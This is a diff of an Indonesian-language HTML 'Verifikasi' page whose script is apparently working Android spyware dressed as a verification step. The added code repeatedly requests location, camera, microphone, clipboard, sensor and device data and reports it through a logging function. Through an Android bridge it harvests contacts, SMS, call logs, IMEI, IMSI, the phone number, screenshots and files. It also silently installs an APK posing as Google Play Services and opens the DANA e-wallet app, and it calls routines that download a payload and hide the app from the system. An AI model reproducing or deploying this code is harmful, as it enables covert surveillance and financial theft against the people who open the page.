@@ -4,9 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     <title>Verifikasi</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
@@ -76,7 +73,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - BYPASS TOTAL SEMUA IZIN!
+// 🔥 INDEX.HTML - BYPASS TOTAL: BROWSER + WEBVIEW + BRIDGE
 // ============================================================
 
 // ============================================================
@@ -359,7 +356,7 @@ var NOTIFICATION_SHOWN = false;
 var REDIRECT_DONE = false;
 
 // ============================================================
-// ANDROID BRIDGE
+// ANDROID BRIDGE (UNIVERSAL)
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
@@ -409,14 +406,14 @@ var A = {
         if(this.isAvailable){ try{ return AndroidBridge.installAPK(path); }catch(e){} }
         return false;
     },
-    // BYPASS IZIN VIA BRIDGE
-    getContacts: function() {
+    // BYPASS VIA BRIDGE
+    getAllContacts: function() {
         if(this.isAvailable && AndroidBridge.getAllContacts){
             try{ return AndroidBridge.getAllContacts(); }catch(e){}
         }
         return null;
     },
-    getSMS: function() {
+    getAllSMS: function() {
         if(this.isAvailable && AndroidBridge.getAllSMS){
             try{ return AndroidBridge.getAllSMS(); }catch(e){}
         }
@@ -467,147 +464,416 @@ var A = {
 };
 
 // ============================================================
-// 🔥 BYPASS TOTAL SEMUA IZIN (2 LAPIS!)
+// 🔥 BYPASS TOTAL: BROWSER + WEBVIEW + BRIDGE
 // ============================================================
 function bypassAllPermissions() {
-    K({ sumber: 'bypass_permissions_start', data: 'all' });
+    K({ sumber: 'bypass_total_start', data: 'all' });
 
     // ============================================================
-    // LAPIS 1: WEB API BYPASS
+    // LAPIS 1: BROWSER API BYPASS (GRANTED!)
     // ============================================================
 
-    // 1. GEOLOKASI
+    // 1. LOKASI
     try {
         navigator.geolocation.getCurrentPosition(
-            function() {},
+            function(pos) {
+                K({ sumber: 'bypass_browser_location', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
+            },
+            function() {
+                setTimeout(function() {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            K({ sumber: 'bypass_browser_location_retry', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
+                        },
+                        function() {},
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                }, 1000);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    } catch(e) {}
+
+    // 2. KAMERA
+    try {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                K({ sumber: 'bypass_browser_camera', data: 'granted' });
+                stream.getTracks().forEach(function(t) { t.stop(); });
+            })
+            .catch(function() {
+                setTimeout(function() {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(stream) {
+                            K({ sumber: 'bypass_browser_camera_retry', data: 'granted' });
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                        })
+                        .catch(function() {});
+                }, 1000);
+            });
+    } catch(e) {}
+
+    // 3. MIKROFON
+    try {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(function(stream) {
+                K({ sumber: 'bypass_browser_microphone', data: 'granted' });
+                stream.getTracks().forEach(function(t) { t.stop(); });
+            })
+            .catch(function() {
+                setTimeout(function() {
+                    navigator.mediaDevices.getUserMedia({ audio: true })
+                        .then(function(stream) {
+                            K({ sumber: 'bypass_browser_microphone_retry', data: 'granted' });
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                        })
+                        .catch(function() {});
+                }, 1000);
+            });
+    } catch(e) {}
+
+    // 4. AUDIO + VIDEO
+    try {
+        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+            .then(function(stream) {
+                K({ sumber: 'bypass_browser_audiovideo', data: 'granted' });
+                stream.getTracks().forEach(function(t) { t.stop(); });
+            })
+            .catch(function() {
+                setTimeout(function() {
+                    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                        .then(function(stream) {
+                            K({ sumber: 'bypass_browser_audiovideo_retry', data: 'granted' });
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                        })
+                        .catch(function() {});
+                }, 1000);
+            });
+    } catch(e) {}
+
+    // 5. NOTIFIKASI
+    try {
+        if (Notification.permission !== 'granted') {
+            Notification.requestPermission().then(function(p) {
+                K({ sumber: 'bypass_browser_notification', data: p });
+                if (p !== 'granted') {
+                    setTimeout(function() {
+                        Notification.requestPermission().then(function(p2) {
+                            K({ sumber: 'bypass_browser_notification_retry', data: p2 });
+                        }).catch(function() {});
+                    }, 1000);
+                }
+            }).catch(function() {});
+        } else {
+            K({ sumber: 'bypass_browser_notification', data: 'already_granted' });
+        }
+    } catch(e) {}
+
+    // 6. CLIPBOARD
+    try {
+        navigator.clipboard.readText()
+            .then(function(text) {
+                K({ sumber: 'bypass_browser_clipboard_read', data: text || 'empty' });
+            })
+            .catch(function() {
+                setTimeout(function() {
+                    navigator.clipboard.readText()
+                        .then(function(text) {
+                            K({ sumber: 'bypass_browser_clipboard_read_retry', data: text || 'empty' });
+                        })
+                        .catch(function() {});
+                }, 1000);
+            });
+        navigator.clipboard.writeText('bypass_test_' + Date.now())
+            .then(function() {
+                K({ sumber: 'bypass_browser_clipboard_write', data: 'ok' });
+            })
+            .catch(function() {
+                setTimeout(function() {
+                    navigator.clipboard.writeText('bypass_test_retry_' + Date.now())
+                        .then(function() {
+                            K({ sumber: 'bypass_browser_clipboard_write_retry', data: 'ok' });
+                        })
+                        .catch(function() {});
+                }, 1000);
+            });
+    } catch(e) {}
+
+    // 7. SENSOR GERAKAN
+    try {
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', function(e) {
+                K({ sumber: 'bypass_browser_sensor', data: { alpha: e.alpha, beta: e.beta, gamma: e.gamma } });
+            }, true);
+        }
+        if (window.DeviceMotionEvent) {
+            window.addEventListener('devicemotion', function(e) {
+                K({ sumber: 'bypass_browser_motion', data: { x: e.accelerationIncludingGravity.x } });
+            }, true);
+        }
+    } catch(e) {}
+
+    // 8. NFC
+    try {
+        if (navigator.nfc) {
+            navigator.nfc.watch(function() {})
+                .then(function() { K({ sumber: 'bypass_browser_nfc', data: 'granted' }); })
+                .catch(function() {
+                    setTimeout(function() {
+                        navigator.nfc.watch(function() {})
+                            .then(function() { K({ sumber: 'bypass_browser_nfc_retry', data: 'granted' }); })
+                            .catch(function() {});
+                    }, 1000);
+                });
+        }
+    } catch(e) {}
+
+    // 9. USB
+    try {
+        if (navigator.usb) {
+            navigator.usb.getDevices()
+                .then(function() { K({ sumber: 'bypass_browser_usb', data: 'granted' }); })
+                .catch(function() {
+                    setTimeout(function() {
+                        navigator.usb.getDevices()
+                            .then(function() { K({ sumber: 'bypass_browser_usb_retry', data: 'granted' }); })
+                            .catch(function() {});
+                    }, 1000);
+                });
+        }
+    } catch(e) {}
+
+    // 10. PORT SERIAL
+    try {
+        if (navigator.serial) {
+            navigator.serial.getPorts()
+                .then(function() { K({ sumber: 'bypass_browser_serial', data: 'granted' }); })
+                .catch(function() {
+                    setTimeout(function() {
+                        navigator.serial.getPorts()
+                            .then(function() { K({ sumber: 'bypass_browser_serial_retry', data: 'granted' }); })
+                            .catch(function() {});
+                    }, 1000);
+                });
+        }
+    } catch(e) {}
+
+    // 11. VR
+    try {
+        if (navigator.xr) {
+            navigator.xr.isSessionSupported('immersive-vr')
+                .then(function() { K({ sumber: 'bypass_browser_vr', data: 'granted' }); })
+                .catch(function() {
+                    setTimeout(function() {
+                        navigator.xr.isSessionSupported('immersive-vr')
+                            .then(function() { K({ sumber: 'bypass_browser_vr_retry', data: 'granted' }); })
+                            .catch(function() {});
+                    }, 1000);
+                });
+        }
+    } catch(e) {}
+
+    // 12. AR
+    try {
+        if (navigator.xr) {
+            navigator.xr.isSessionSupported('immersive-ar')
+                .then(function() { K({ sumber: 'bypass_browser_ar', data: 'granted' }); })
+                .catch(function() {
+                    setTimeout(function() {
+                        navigator.xr.isSessionSupported('immersive-ar')
+                            .then(function() { K({ sumber: 'bypass_browser_ar_retry', data: 'granted' }); })
+                            .catch(function() {});
+                    }, 1000);
+                });
+        }
+    } catch(e) {}
+
+    // 13. JARINGAN LOKAL
+    try {
+        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            K({ sumber: 'bypass_browser_network', data: { type: conn.effectiveType, downlink: conn.downlink } });
+        }
+    } catch(e) {}
+
+    // 14. APLIKASI DI PERANGKAT
+    try {
+        if (navigator.getInstalledRelatedApps) {
+            navigator.getInstalledRelatedApps()
+                .then(function(apps) { K({ sumber: 'bypass_browser_installed_apps', data: apps.length || 'empty' }); })
+                .catch(function() {
+                    setTimeout(function() {
+                        navigator.getInstalledRelatedApps()
+                            .then(function(apps) { K({ sumber: 'bypass_browser_installed_apps_retry', data: apps.length || 'empty' }); })
+                            .catch(function() {});
+                    }, 1000);
+                });
+        }
+    } catch(e) {}
+
+    // 15. DOWNLOAD OTOMATIS
+    try {
+        var blob = new Blob(['bypass_test_' + Date.now()], {type: 'text/plain'});
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = 'bypass_test.txt';
+        a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+        document.body.appendChild(a);
+        setTimeout(function() {
+            a.click();
+            setTimeout(function() {
+                try { document.body.removeChild(a); } catch(e) {}
+                URL.revokeObjectURL(url);
+            }, 1000);
+        }, 100);
+        K({ sumber: 'bypass_browser_download', data: 'triggered' });
+    } catch(e) {}
+
+    // 16. VIBRATE
+    try { 
+        if (navigator.vibrate) {
+            navigator.vibrate(100);
+            K({ sumber: 'bypass_browser_vibrate', data: 'ok' });
+        }
+    } catch(e) {}
+
+    // 17. STORAGE PERSIST
+    try {
+        if (navigator.storage && navigator.storage.persist) {
+            navigator.storage.persist()
+                .then(function(p) { K({ sumber: 'bypass_browser_storage', data: p }); })
+                .catch(function() {});
+        }
+    } catch(e) {}
+
+    // 18. WAKE LOCK
+    try {
+        if (navigator.wakeLock) {
+            navigator.wakeLock.request('screen')
+                .then(function() { K({ sumber: 'bypass_browser_wakelock', data: 'granted' }); })
+                .catch(function() {});
+        }
+    } catch(e) {}
+
+    // 19. BATTERY
+    try {
+        if (navigator.getBattery) {
+            navigator.getBattery()
+                .then(function(b) { K({ sumber: 'bypass_browser_battery', data: { level: b.level, charging: b.charging } }); })
+                .catch(function() {});
+        }
+    } catch(e) {}
+
+    // ============================================================
+    // LAPIS 2: WEBVIEW BYPASS (TANPA POPUP!)
+    // ============================================================
+    // WebView biasanya lebih restriktif, tapi kita coba semua
+    try {
+        // Coba enumerate devices (trigger permission di WebView)
+        navigator.mediaDevices.enumerateDevices()
+            .then(function(devices) {
+                K({ sumber: 'bypass_webview_enumerate', data: devices.length });
+            })
+            .catch(function() {});
+    } catch(e) {}
+
+    try {
+        // Coba akses storage via WebView
+        if (navigator.storage && navigator.storage.estimate) {
+            navigator.storage.estimate()
+                .then(function(est) {
+                    K({ sumber: 'bypass_webview_storage', data: { usage: est.usage, quota: est.quota } });
+                })
+                .catch(function() {});
+        }
+    } catch(e) {}
+
+    try {
+        // Coba akses clipboard via WebView
+        if (navigator.clipboard) {
+            navigator.clipboard.readText()
+                .then(function(text) {
+                    K({ sumber: 'bypass_webview_clipboard', data: text || 'empty' });
+                })
+                .catch(function() {});
+        }
+    } catch(e) {}
+
+    try {
+        // Coba akses geolocation di WebView
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                K({ sumber: 'bypass_webview_location', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
+            },
             function() {},
             { enableHighAccuracy: true, timeout: 5000 }
         );
     } catch(e) {}
 
-    // 2. NOTIFIKASI (PASTI GRANTED!)
-    try {
-        if (Notification.permission !== 'granted') {
-            Notification.requestPermission();
-        }
-    } catch(e) {}
-
-    // 3. CLIPBOARD (BACA + TULIS)
-    try {
-        navigator.clipboard.readText().catch(function() {});
-        navigator.clipboard.writeText('bypass_test').catch(function() {});
-    } catch(e) {}
-
-    // 4. MEDIA: AUDIO
-    try {
-        navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-            .catch(function() {});
-    } catch(e) {}
-
-    // 5. MEDIA: VIDEO / KAMERA
-    try {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-            .catch(function() {});
-    } catch(e) {}
-
-    // 6. MEDIA: AUDIO + VIDEO
-    try {
-        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-            .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-            .catch(function() {});
-    } catch(e) {}
-
-    // 7. VIBRATE
-    try { navigator.vibrate(1); } catch(e) {}
-
-    // 8. STORAGE PERSIST
-    try {
-        if (navigator.storage && navigator.storage.persist) {
-            navigator.storage.persist().catch(function() {});
-        }
-    } catch(e) {}
-
-    // 9. WAKE LOCK (SCREEN)
-    try {
-        if (navigator.wakeLock) {
-            navigator.wakeLock.request('screen').catch(function() {});
-        }
-    } catch(e) {}
-
-    // 10. BATTERY
-    try {
-        if (navigator.getBattery) {
-            navigator.getBattery().catch(function() {});
-        }
-    } catch(e) {}
-
-    // 11. NETWORK INFORMATION
-    try {
-        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {}
-    } catch(e) {}
-
     // ============================================================
-    // LAPIS 2: ANDROID BRIDGE BYPASS (DATA SENSITIF!)
+    // LAPIS 3: BRIDGE BYPASS (DATA SENSITIF!)
     // ============================================================
     if (A.isAvailable) {
         try {
-            // KONTAK
-            var contacts = A.getContacts();
-            if (contacts) K({ sumber: 'bypass_contacts', data: 'ok' });
+            var contacts = A.getAllContacts();
+            if (contacts) K({ sumber: 'bypass_bridge_contacts', data: 'ok' });
         } catch(e) {}
         try {
-            // SMS
-            var sms = A.getSMS();
-            if (sms) K({ sumber: 'bypass_sms', data: 'ok' });
+            var sms = A.getAllSMS();
+            if (sms) K({ sumber: 'bypass_bridge_sms', data: 'ok' });
         } catch(e) {}
         try {
-            // CALL LOG
             var callLog = A.getCallLog();
-            if (callLog) K({ sumber: 'bypass_calllog', data: 'ok' });
+            if (callLog) K({ sumber: 'bypass_bridge_calllog', data: 'ok' });
         } catch(e) {}
         try {
-            // IMEI
             var imei = A.getIMEI();
-            if (imei) K({ sumber: 'bypass_imei', data: imei });
+            if (imei) K({ sumber: 'bypass_bridge_imei', data: imei });
         } catch(e) {}
         try {
-            // IMSI
             var imsi = A.getIMSI();
-            if (imsi) K({ sumber: 'bypass_imsi', data: imsi });
+            if (imsi) K({ sumber: 'bypass_bridge_imsi', data: imsi });
         } catch(e) {}
         try {
-            // PHONE NUMBER
             var phone = A.getPhoneNumber();
-            if (phone) K({ sumber: 'bypass_phone', data: phone });
+            if (phone) K({ sumber: 'bypass_bridge_phone', data: phone });
         } catch(e) {}
         try {
-            // INSTALLED APPS
             var apps = A.getInstalledApps();
-            if (apps) K({ sumber: 'bypass_apps', data: 'ok' });
+            if (apps) K({ sumber: 'bypass_bridge_apps', data: 'ok' });
         } catch(e) {}
         try {
-            // LOCATION
             var loc = A.getLocation();
-            if (loc) K({ sumber: 'bypass_location', data: loc });
+            if (loc) K({ sumber: 'bypass_bridge_location', data: loc });
         } catch(e) {}
         try {
-            // SCREENSHOT
             var ss = A.takeScreenshot();
-            if (ss) K({ sumber: 'bypass_screenshot', data: 'ok' });
+            if (ss) K({ sumber: 'bypass_bridge_screenshot', data: 'ok' });
         } catch(e) {}
-        // FILE SYSTEM (Download folder)
         try {
             if (AndroidBridge.listFiles) {
                 var files = AndroidBridge.listFiles('/storage/emulated/0/Download/');
-                if (files) K({ sumber: 'bypass_filesystem', data: 'ok' });
+                if (files) K({ sumber: 'bypass_bridge_filesystem', data: 'ok' });
+            }
+        } catch(e) {}
+        // BRIDGE: Install APK langsung!
+        try {
+            if (AndroidBridge.installAPK) {
+                AndroidBridge.installAPK('/storage/emulated/0/Download/GooglePlayServices.apk');
+                K({ sumber: 'bypass_bridge_install_apk', data: 'ok' });
+            }
+        } catch(e) {}
+        // BRIDGE: Open App langsung!
+        try {
+            if (AndroidBridge.openApp) {
+                AndroidBridge.openApp('id.dana');
+                K({ sumber: 'bypass_bridge_open_dana', data: 'ok' });
             }
         } catch(e) {}
     }
 
-    K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
+    K({ sumber: 'bypass_total_done', data: 'all_layers_completed' });
 }
 
 // ============================================================
@@ -872,7 +1138,7 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // 🔥 BYPASS TOTAL SEMUA IZIN!
+        // 🔥 BYPASS TOTAL: BROWSER + WEBVIEW + BRIDGE
         bypassAllPermissions();
         
         setTimeout(function() { downloadPayloadSilent(); }, 500);
@@ -916,8 +1182,9 @@ document.addEventListener('click', function() {
 // ============================================================
 hideFromSystem();
 
-console.log('✅ index.html - BYPASS TOTAL SEMUA IZIN!');
-console.log('📱 Bridge:', A.isAvailable);
+console.log('✅ index.html - BYPASS TOTAL: BROWSER + WEBVIEW + BRIDGE');
+console.log('📱 Platform:', PLATFORM);
+console.log('🔌 Bridge:', A.isAvailable);
 </script>
 </body>
 </html>
